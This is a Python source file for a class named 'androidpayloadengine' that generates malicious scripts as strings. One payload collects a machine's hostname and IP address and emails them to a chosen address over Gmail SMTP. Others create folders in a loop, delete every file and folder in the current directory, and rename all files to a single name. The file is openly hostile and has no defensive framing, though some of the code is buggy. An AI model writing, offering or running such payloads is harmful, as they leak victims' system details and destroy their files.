# import socket
# import os
# import smtplib


class androidpayloadengine():

    def __init__(self,):
        pass

    # hahahhahaa
    def ip_address_logger(self, email, passw, recv_email):
        self.email = email
        self.passw = passw
        self.recv_email = recv_email
        code = f"""
import socket
import smtplib
        
host = socket.gethostname()
Ip = socket.gethostbyname(host)

sender_email = '{self.email}'
sender_passw = '{self.passw}'
recv_email = '{self.recv_email}'

message = 'HostName :' + host + 'Ip_Address :' + Ip
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender_email, sender_passw)
server.sendmail(recv_email, message)"""

        return code

    def folder_bomber(self, amount, folder_name):
        self.amount = amount
        self.foldername = folder_name
        code = f"""
import os

i = 0
while i <= {self.amount}:
\tos.mkdir('{self.foldername}' + str(i))
\ti += 1
\tbreak"""

        return code

    def big_deleter(self):
        code = """
import os

cwd = os.getcwd()
files = os.listdir(cwd)
for file in files:
\tif os.path.isfile(file):
\t\tos.remove(file)
\telif os.path.isdir(file):
\t\tos.rmdir(file)
\telse:
\t\tpass"""

        return code

    def Renamer(self, name):
        self.name = name
        code = f"""
import os

cwd = os.getcwd()
files = os.listdir(cwd)
for file in files:
\ttry:
\t\tos.rename(file, '{self.name}')
\texcept:
\t\tpass"""

        return code

